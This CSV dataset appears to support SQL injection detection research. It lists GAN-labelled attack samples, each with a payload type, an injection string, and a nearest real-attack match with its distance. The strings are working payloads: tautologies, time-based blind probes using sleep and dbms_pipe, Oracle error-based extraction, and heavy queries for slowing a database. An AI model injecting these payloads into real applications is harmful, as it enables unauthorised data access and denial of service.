id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_001529,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,5.8721916286316835
GAN_001530,attack,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",nearest_attack_euclidean,R008308,4.220489125183767
GAN_001531,attack,time,"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",nearest_attack_euclidean,R007265,7.081823823688396
GAN_001532,attack,boolean,end and    (    (   'zeyr'  =  'zeyr,nearest_attack_euclidean,R005862,4.069240697902429
GAN_001533,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  ""oiuw""  =  ""oiuw",nearest_attack_euclidean,R003127,4.4362880635158515
GAN_001534,attack,error,1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,nearest_attack_euclidean,R004598,8.365481166389797
GAN_001535,attack,boolean,"1""  )   where 6632  =  6632 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R001909,4.2867738763528465
GAN_001536,attack,boolean,"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",nearest_attack_euclidean,R001481,6.82554689523249
GAN_001537,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000350,4.380835735172865
GAN_001538,attack,other,"1,SELECT *",nearest_attack_euclidean,R000158,5.9332305574377555
GAN_001539,attack,boolean,"1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484",nearest_attack_euclidean,R001481,4.111594349071546
GAN_001540,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,4.193597752897237
GAN_001541,attack,boolean,"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R002589,3.7931166753770937
GAN_001542,attack,time,select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf,nearest_attack_euclidean,R003039,5.161549390783074
GAN_001543,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,8.353989595684386
GAN_001544,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R003088,4.200092351741128
GAN_001545,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R003310,11.67497440839743
GAN_001546,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000141,4.6572484287694955
GAN_001547,attack,time,"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",nearest_attack_euclidean,R008629,6.197793378701127
GAN_001548,attack,other,"1""   )    )    as bosq where 4695  =  4695",nearest_attack_euclidean,R004217,3.6876772697228852
GAN_001549,attack,time,"1""   )    )    or sleep  (  5  )   and    (    (   ""mtmb"" like ""mtmb",nearest_attack_euclidean,R008186,9.05281532504693
GAN_001550,attack,time,1'||  (  select 'zqwd' where 1647  =  1647 rlike sleep  (  5   )    )   ||',nearest_attack_euclidean,R005787,6.218962909766719
GAN_001551,attack,boolean,end and   (  'uxzv'  =  'uxzv,nearest_attack_euclidean,R007313,4.907413353088448
GAN_001552,attack,boolean,"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",nearest_attack_euclidean,R001695,8.458427921564157
GAN_001553,attack,other,"1'   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  ",nearest_attack_euclidean,R006499,8.590113138588658
GAN_001554,attack,boolean,"1'+  (  select dgnt where 4701  =  4701 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R002589,3.7021433162428377
GAN_001555,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,5.920844135502939
GAN_001556,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,4.276836317856211
GAN_001557,attack,boolean,"1'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006953,4.137212075321824
GAN_001558,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  --",nearest_attack_euclidean,R001370,4.968835307139198
GAN_001559,attack,boolean,"1' where 1272  =  1272 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R005514,3.932229200841921
GAN_001560,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R002827,7.538433942233618
GAN_001561,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,5.821373201533996
GAN_001562,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R008246,5.002962986883445
GAN_001563,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R005088,5.378579820762778
GAN_001564,attack,time,"1""   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R008380,4.659266438365015
GAN_001565,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R003024,4.215389837696341
GAN_001566,attack,error,"1' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R005088,6.730656406183685
GAN_001567,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,4.197497167955874
GAN_001568,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  #",nearest_attack_euclidean,R000928,4.553179351293803
GAN_001569,attack,time,"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",nearest_attack_euclidean,R004537,5.832510137988222
GAN_001570,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,2.858475666185159
GAN_001571,attack,boolean,"1   )    )    as gdcg where 2329  =  2329 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R008938,3.718483419867708
GAN_001572,attack,time,"1""  )   and sleep  (  5  )   and   (  ""fsuf"" like ""fsuf",nearest_attack_euclidean,R007882,8.517304412967325
GAN_001573,attack,boolean,"1'||  (  select 'eamo' where 4958  =  4958 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R006679,4.516518339109852
GAN_001574,attack,boolean,"1'+  (  select eztr where 4260  =  4260 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",nearest_attack_euclidean,R005688,4.657991156050372
GAN_001575,attack,boolean,"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",nearest_attack_euclidean,R002119,6.426076921571219
GAN_001576,attack,time,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""xbft""  =  ""xbft",nearest_attack_euclidean,R008539,10.026942271025735
GAN_001577,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R001060,5.119541247580651
GAN_001578,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,4.672752572630525
GAN_001579,attack,time,1'  )   or sleep  (  5  )   and   (  'fizk'  =  'fizk,nearest_attack_euclidean,R005904,4.005794343634733
GAN_001580,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  1491  =  1491",nearest_attack_euclidean,R008147,5.392010173145626
GAN_001581,attack,other,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual",nearest_attack_euclidean,R006487,4.042130545249854
GAN_001582,attack,time," select sleep  (  5  )   and    (    (   ""wueo""  =  ""wueo",nearest_attack_euclidean,R004089,4.226524186262188
GAN_001583,attack,boolean,admin'  )   or '1'  =  '1,nearest_attack_euclidean,R000471,4.377938265769502
GAN_001584,attack,boolean,"1 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   # jmki",nearest_attack_euclidean,R003951,4.801114126403849
GAN_001585,attack,boolean,"1'+  (  select 'zxxh' where 4065  =  4065 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007158,7.682033718588716
GAN_001586,attack,boolean,select * from users where id  =  '1'   or 1  =  1 -- 1',nearest_attack_euclidean,R000350,5.52830235217384
GAN_001587,attack,time,"1'   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  'ayjb' like 'ayjb",nearest_attack_euclidean,R003516,5.150462734916281
GAN_001588,attack,boolean," end and ""%""  =  """,nearest_attack_euclidean,R008957,4.79059660048134
GAN_001589,attack,boolean,1%'  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  '%'  =  ',nearest_attack_euclidean,R006512,10.18726795094322
GAN_001590,attack,time,"1""  )   as mohv where 2171  =  2171 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R006072,7.31913971187483
GAN_001591,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000840,4.194219071174788
GAN_001592,attack,boolean,"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",nearest_attack_euclidean,R005785,6.906711840250287
GAN_001593,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""uqyb""  =  ""uqyb",nearest_attack_euclidean,R008542,6.448556136465145
GAN_001594,attack,error,"1"" and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",nearest_attack_euclidean,R002687,5.931219307685552
GAN_001595,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,5.001301390827668
GAN_001596,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,nearest_attack_euclidean,R001060,4.233983740401939
GAN_001597,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,6.197044864313886
GAN_001598,attack,boolean,"1  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  5099  =  5099",nearest_attack_euclidean,R001695,6.126415093866668
GAN_001599,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",nearest_attack_euclidean,R007473,4.008797375729685
GAN_001600,attack,boolean,"1   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   8554  =  8554",nearest_attack_euclidean,R002258,4.951334383010141
GAN_001601,attack,time,1' in boolean mode  )   or sleep  (  5  )  #,nearest_attack_euclidean,R003024,5.171058148140614
GAN_001602,attack,boolean,hi' or 'a'  =  'a,nearest_attack_euclidean,R000605,5.784871917458705
GAN_001603,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",nearest_attack_euclidean,R007473,3.80426479098777
GAN_001604,attack,other,1 exec sp_   (  or exec xp_  ) ,nearest_attack_euclidean,R000634,3.7010889816312775
GAN_001605,attack,boolean,1   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   9452  =  9452,nearest_attack_euclidean,R006343,8.220932264241977
GAN_001606,attack,error,1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R001276,5.36132324199399
GAN_001607,attack,other,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",nearest_attack_euclidean,R001093,6.853613618793546
GAN_001608,attack,boolean,1 and user_name  (    )     =   'dbo',nearest_attack_euclidean,R000079,3.0987049956912927
GAN_001609,attack,other,"1,SELECT *",nearest_attack_euclidean,R000158,4.858023429094669
GAN_001610,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",nearest_attack_euclidean,R004633,6.182936277517583
GAN_001611,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R001030,5.214875055903518
GAN_001612,attack,other,or 'whatever' in   (  'whatever'  ) ,nearest_attack_euclidean,R000348,7.530274725734701
